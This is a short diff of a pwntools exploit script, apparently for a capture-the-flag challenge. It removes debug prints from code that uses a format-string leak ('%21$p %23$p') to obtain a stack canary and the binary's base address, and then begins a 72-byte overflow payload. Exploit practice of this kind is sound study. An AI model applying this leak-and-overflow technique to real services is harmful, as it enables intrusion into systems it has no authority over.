@@ -200,13 +200,10 @@ p.recvuntil(b">> ")
 p.sendline(b'y')
 p.recvuntil(b': ')
 p.sendline('%21$p %23$p'.encode())
-print(p.recvline())
+p.recvline()
 x = p.recvline().decode()
 canary = x[x.index("k",20)+2:]
-print(canary.split(" "))
-print("HERE:")
 elf.address = eval(canary.split(" ")[1].strip())-0x1552
-print(elf.address)
 p.recvline()
 payload = flat(
     b'A'*72,
